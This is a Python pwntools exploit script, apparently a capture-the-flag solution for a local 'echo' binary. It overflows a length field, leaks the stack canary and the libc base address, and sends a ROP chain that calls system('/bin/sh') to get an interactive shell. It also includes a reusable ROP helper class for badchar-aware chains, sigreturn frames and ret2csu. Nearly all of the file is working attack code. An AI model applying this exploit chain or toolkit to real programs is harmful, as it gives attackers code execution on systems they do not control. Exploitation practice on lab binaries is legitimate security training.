from typing import Literal
from ctypes import CDLL
import os
import pwn

os.chdir(os.path.dirname(__file__))
pwn.context.log_level = "debug"
use_patched: bool = False
exe_path = "binary" if (not use_patched) else "debug/binary_patched"
gdbscript: str = """
	brva 0x12e8
	c
"""

def exploit():
	exe = pwn.context.binary = pwn.ELF(exe_path)
	libc = exe.libc
	if (libc and pwn.context.arch == "amd64"):
		cdll = CDLL(libc.path)

	# <interactions>

	with connect(
		[exe.path], "localhost", "1091",
		gdbscript, ssl=False,
		default_mode="local",
	) as io:

		# Override buffer length
		rop = ROP(exe, libc)
		rop.pad(64)
		rop.raw(b"\x48") # length of the next payload
		io.sendafter(b"echo ", bytes(rop))

		# Leak canary
		rop = ROP(exe, libc)
		rop.pad(64)
		rop.raw(b"\x77") # length of the next payload
		rop.pad(7)
		rop.raw(b"\xff") # override canary null-terminator
		io.sendafter(b"echo ", bytes(rop))
		io.recvuntil(b"\xff")
		canary = int.from_bytes(b"\0" + io.recvn(7), byteorder="little")
		print("canary:", hex(canary))

		# Leak libc base
		rop = ROP(exe, libc)
		rop.pad(64)
		rop.raw(b"\xf8") # long read
		rop.pad(7)
		rop.pad(8) # canary placeholder
		rop.pad(8)
		rop.pad(8)
		rop.pad(16)
		rop.pad(7)
		rop.raw(b"\xff") # after this there is the main return address
		io.sendafter(b"echo ", bytes(rop))
		io.recvuntil(b"\xff")
		libc.address = int.from_bytes(io.recvn(6), byteorder="little") - 0x02a1ca
		print("ASLR:", hex(libc.address))

		# Actual ROP too system("/bin/sh")
		rop = ROP(exe, libc)
		rop.raw(b"\0")
		rop.pad(63)
		rop.raw(b"\xf8")
		rop.pad(7)
		rop.raw(canary)
		rop.pad(8)
		rop.add_ret()
		rop.call("system", "/bin/sh")
		io.sendlineafter(b"echo ", bytes(rop))

		io.interactive()


def main():
	exploit()


def connect(
		args: list[str], hostname: str, port: int | str,
		gdbscript: str = '', ssl: bool = False, add_env: dict[str, str] = {},
		default_mode: Literal["remote", "local", "gdb"] = "local",
	) -> pwn.tube:

	if pwn.args.LOCAL:
		mode = "local"
	elif pwn.args.GDB:
		mode = "gdb"
	elif pwn.args.REMOTE:
		mode = "remote"
	else:
		mode = default_mode

	env = os.environ.copy()
	env.update(add_env)

	if mode == "remote":
		io = pwn.remote(hostname, port, ssl=ssl)
	elif mode == "local":
		io = pwn.process(argv=args, env=env)
	elif mode == "gdb":
		io = pwn.gdb.debug(args=args, gdbscript=gdbscript)
	else:
		raise ValueError("Unknown mode")

	return io


def protect_ptr(pos, ptr):
	return (pos >> 12) ^ ptr

def decrypt_ptr(val):
    mask = 0xfff << (64-12)
    while mask:
        v = val & mask
        val ^= v >> 12
        mask >>= 12
    return val


class ROP(pwn.ROP):
	def __init__(self, *elfs: pwn.ELF, base: int | None = None, badchars: bytes = b'') -> None:

		# Dict for already found string
		self.string_addr = {}

		# Init a cyclic generator for padding without badchars
		self.pad_generator = pwn.cyclic_gen(alphabet=pwn.context.cyclic_alphabet.translate(None, delete=badchars))

		# Include in ROP only the elf with known base address
		elfs = [elf for elf in elfs if isinstance(elf, pwn.ELF) and elf.address]

		super().__init__(elfs, base, badchars)

	def pad(self, length: int, pattern: bytes = b'') -> None:
		"""Insert some padding character of the given length, using a certain pattern if given"""

		if pattern:
			self.raw((pattern * (length//len(pattern) + 1))[:length])
		else:
			self.raw(self.pad_generator.get(length))

	def add_ret(self) -> None:
		"""Add a ret to align the stack pointer"""

		self.raw(self.ret.address)

	def have_badchar(self, value) -> bytes:
		"""Check if any byte of the value is not a bad char"""

		for byte in pwn.flat(value):
			if byte in self._badchars:
				return byte.to_bytes()
		return b''
	
	def resolve(self, resolvable):
		"""Resolve a symbol to an address"""

		addr = super().resolve(resolvable)
		if badchar := self.have_badchar(addr):
			raise ValueError(f"The address of {resolvable} have the badchar {badchar}")
		return addr

	def resolve_value(self, value) -> int:
		"""Transform a value from the supported type in integer"""

		# Transform string into bytes with ending nullbyte
		if isinstance(value, str):
			value = value.encode()
			if value[-1] != 0:
				value += b'\0'

		elif value is None:
			value = 0

		# Search bytes in the elfs, returning the address
		if isinstance(value, bytes):
			if value in self.string_addr:
				return self.string_addr[value]

			for elf in self.elfs:
				for addr in elf.search(value):
					if not self.have_badchar(addr):
						self.string_addr[value] = addr
						return addr
					
			raise ValueError(f"Cannot find an address of the string {value} without badchars")
		
		elif isinstance(value, int):
			if badchar := self.have_badchar(value):
				raise ValueError(f"The value {value} have the badchar {badchar}")
			return value
		
		raise TypeError(f"Unsupported type {type(value)} of the value {value}")
   
	def call(self, resolvable, *arguments) -> None:
		"""Call an address with given arguments"""

		args = [self.resolve_value(arg) for arg in arguments]
		super().call(self.resolve(resolvable), args)

	def system_call(self, syscall: int, *arguments) -> None:
		"""Call the given systemcall with arguments"""

		if badchar := self.have_badchar(syscall):
			raise ValueError(f"Syscall {syscall} have the badchar {badchar}")
		
		self(rax=syscall)
		self.call(self.syscall.address, *arguments)

	def sigreturn(self, registers: dict):
		"""Do a sigreturn with the given registers"""

		# Handle symbols in the 'rip' register
		if 'rip' in registers:
			registers['rip'] = self.resolve(registers['rip'])

		# Handle syscall in the 'rax' register if 'rip' is not setted
		elif 'rax' in registers:
			registers['rip'] = self.syscall.address

		# Build sigreturn frame
		frame = pwn.SigreturnFrame()
		for reg, value in registers.items():
			frame[reg] = self.resolve_value(value)

		self.system_call(pwn.constants.SYS_rt_sigreturn)
		self.raw(bytes(frame))

	def ret2csu(self, edi=0, rsi=0, rdx=0, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0, call=None):
		"""Do a ret2csu with the given registers"""

		regs = [self.resolve_value(reg) for reg in (edi, rsi, rdx, rbx, rbp, r12, r13, r14, r15)]
		super().ret2csu(*regs, call)


if __name__ == "__main__":
	# Personalize this
	if os.getenv("WSL_DISTRO_NAME"):
		terminal_settings = ["wt.exe", "-w", "0"]
		if "WT_SESSION" in os.environ: terminal_settings += ["sp"]
		terminal_settings += ["wsl", "--cd", os.path.abspath(os.curdir), "-d", os.getenv("WSL_DISTRO_NAME")]
		pwn.context.terminal = terminal_settings

	main()
